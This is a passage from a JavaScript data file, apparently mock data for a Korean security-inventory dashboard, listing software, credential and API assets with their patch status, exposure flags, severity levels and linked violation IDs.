  { id: "SW-001", name: "OTA 배포 플랫폼",       type: "플랫폼",     version: "3.2.1",   linked_asset: "ASSET-001", cve_count: 2, patch_status: "미적용",   eol: false, severity: "High",     violation_ids: ["INV-007"], last_updated: "2025-03-10" },
  { id: "SW-002", name: "블랙박스 펌웨어",        type: "펌웨어",     version: "2.1.3",   linked_asset: "ASSET-014", cve_count: 3, patch_status: "지연",     eol: false, severity: "High",     violation_ids: ["INV-007"], last_updated: "2025-02-20" },
  { id: "SW-003", name: "홈캠 펌웨어",            type: "펌웨어",     version: "1.4.0",   linked_asset: "ASSET-016", cve_count: 1, patch_status: "미적용",   eol: false, severity: "Medium",   violation_ids: ["INV-055"], last_updated: "2025-04-01" },
  { id: "SW-004", name: "Ubuntu 20.04 LTS",       type: "OS",         version: "20.04.6", linked_asset: "ASSET-003", cve_count: 5, patch_status: "미적용",   eol: false, severity: "High",     violation_ids: ["INV-031"], last_updated: "2025-01-15" },
  { id: "SW-005", name: "CentOS 7",               type: "OS",         version: "7.9.2009",linked_asset: "ASSET-002", cve_count: 8, patch_status: "지연",     eol: true,  severity: "Critical", violation_ids: ["INV-042"], last_updated: "2024-11-01" },
  { id: "SW-006", name: "MySQL 5.7",              type: "DB",         version: "5.7.44",  linked_asset: "ASSET-002", cve_count: 4, patch_status: "미적용",   eol: true,  severity: "High",     violation_ids: ["INV-042"], last_updated: "2024-12-10" },
  { id: "SW-007", name: "Nginx",                  type: "애플리케이션", version: "1.18.0", linked_asset: "ASSET-004", cve_count: 2, patch_status: "적용완료", eol: false, severity: "Medium",   violation_ids: [],          last_updated: "2025-05-20" },
  { id: "SW-008", name: "OTA 클라이언트 에이전트", type: "에이전트",   version: "2.0.1",   linked_asset: "ASSET-015", cve_count: 0, patch_status: "적용완료", eol: false, severity: null,       violation_ids: [],          last_updated: "2025-06-01" },
];

// type: 서명키 | 인증서 | 계정 | API 토큰
// storage: HSM | 파일시스템 | 환경변수 | DB
// privilege: 최고 | 과다 | 정상
// status: 위험 | 취약 | 만료임박 | 정상
export const credentialAssets = [
  { id: "CRED-001", name: "OTA 서명키 (RSA-4096)",       type: "서명키",   owner: "배포팀",  storage: "파일시스템", mfa: false, last_rotated: "2024-01-15", expires_at: null,         exposed: true,  privilege: "최고", severity: "Critical", online_status: "온라인",    violation_ids: ["INV-031"] },
  { id: "CRED-002", name: "블랙박스 디바이스 인증서",     type: "인증서",   owner: "DevOps",  storage: "HSM",       mfa: true,  last_rotated: "2025-03-01", expires_at: "2025-09-01", exposed: false, privilege: "정상", severity: "High",     status: "만료임박", violation_ids: ["INV-061"] },
  { id: "CRED-003", name: "인프라 관리자 계정",           type: "계정",     owner: "인프라팀", storage: "-",         mfa: false, last_rotated: "2023-11-20", expires_at: null,         exposed: false, privilege: "과다", severity: "Critical", online_status: "온라인",    violation_ids: ["INV-031"] },
  { id: "CRED-004", name: "드론 협력사 API 토큰",         type: "API 토큰", owner: "연동팀",  storage: "환경변수",  mfa: false, last_rotated: "2025-01-10", expires_at: "2025-07-10", exposed: false, privilege: "정상", severity: "Medium",   status: "만료임박", violation_ids: ["INV-V010"] },
  { id: "CRED-005", name: "DB 마스터 계정",               type: "계정",     owner: "DBA",     storage: "-",         mfa: false, last_rotated: "2024-08-01", expires_at: null,         exposed: false, privilege: "과다", severity: "High",     online_status: "온라인",    violation_ids: ["INV-042"] },
  { id: "CRED-006", name: "자동차 협력사 API 토큰",       type: "API 토큰", owner: "연동팀",  storage: "환경변수",  mfa: false, last_rotated: "2025-02-20", expires_at: "2025-08-20", exposed: false, privilege: "정상", severity: null,       online_status: "온라인",    violation_ids: [] },
  { id: "CRED-007", name: "웹캠 디바이스 루트 인증서",    type: "인증서",   owner: "보안팀",  storage: "HSM",       mfa: true,  last_rotated: "2025-05-01", expires_at: "2026-05-01", exposed: false, privilege: "정상", severity: null,       online_status: "온라인",    violation_ids: [] },
  { id: "CRED-008", name: "CI/CD 배포 키",               type: "서명키",   owner: "개발팀",  storage: "파일시스템", mfa: false, last_rotated: "2024-12-01", expires_at: null,         exposed: false, privilege: "과다", severity: "Medium",   online_status: "온라인",    violation_ids: [] },
];

// type: REST | GraphQL | gRPC | WebSocket
// auth: JWT | API Key | OAuth2 | mTLS | 없음
// scope: 내부 | 외부 | 파트너
// status: 위험 | 취약 | 정상
export const apiAssets = [
  { id: "API-001", name: "OTA 배포 API",            type: "REST",      endpoint: "/api/v1/deploy",        auth: "JWT",     scope: "내부",  exposed: false, rate_limit: true,  version: "v1", linked_asset: "ASSET-001", severity: "High",     online_status: "온라인",  violation_ids: ["INV-007"], last_audited: "2025-03-10" },
  { id: "API-002", name: "드론 연동 API",            type: "REST",      endpoint: "/api/v1/drone/sync",    auth: "API Key", scope: "파트너", exposed: true,  rate_limit: false, version: "v1", linked_asset: "ASSET-005", severity: "Critical", online_status: "온라인",  violation_ids: ["INV-031"], last_audited: "2025-01-15" },
  { id: "API-003", name: "블랙박스 데이터 수집 API",  type: "REST",      endpoint: "/api/v2/blackbox/data", auth: "mTLS",    scope: "내부",  exposed: false, rate_limit: true,  version: "v2", linked_asset: "ASSET-014", severity: null,       online_status: "온라인",  violation_ids: [],          last_audited: "2025-05-01" },
  { id: "API-004", name: "홈캠 스트리밍 API",        type: "WebSocket", endpoint: "/ws/cam/stream",         auth: "JWT",     scope: "외부",  exposed: true,  rate_limit: true,  version: "v1", linked_asset: "ASSET-016", severity: "Medium",   online_status: "온라인",  violation_ids: ["INV-055"], last_audited: "2025-04-01" },
  { id: "API-005", name: "OTA 상태 조회 API",        type: "REST",      endpoint: "/api/v1/ota/status",    auth: "API Key", scope: "파트너", exposed: true,  rate_limit: false, version: "v1", linked_asset: "ASSET-001", severity: "High",     online_status: "온라인",  violation_ids: ["INV-007"], last_audited: "2025-02-20" },
  { id: "API-006", name: "차량 데이터 분석 API",     type: "GraphQL",   endpoint: "/graphql",               auth: "OAuth2",  scope: "내부",  exposed: false, rate_limit: true,  version: "v1", linked_asset: "ASSET-003", severity: null,       online_status: "온라인",  violation_ids: [],          last_audited: "2025-05-15" },
  { id: "API-007", name: "관리자 내부 API",          type: "REST",      endpoint: "/api/admin",             auth: "없음",    scope: "내부",  exposed: false, rate_limit: false, version: "v1", linked_asset: "ASSET-002", severity: "Critical", online_status: "온라인",  violation_ids: ["INV-031"], last_audited: "2024-11-01" },
  { id: "API-008", name: "자동차 협력사 연동 API",   type: "REST",      endpoint: "/api/v1/partner/auto",  auth: "OAuth2",  scope: "파트너", exposed: true,  rate_limit: true,  version: "v1", linked_asset: "ASSET-004", severity: null,       online_status: "온라인",  violation_ids: [],          last_audited: "2025-06-01" },
];
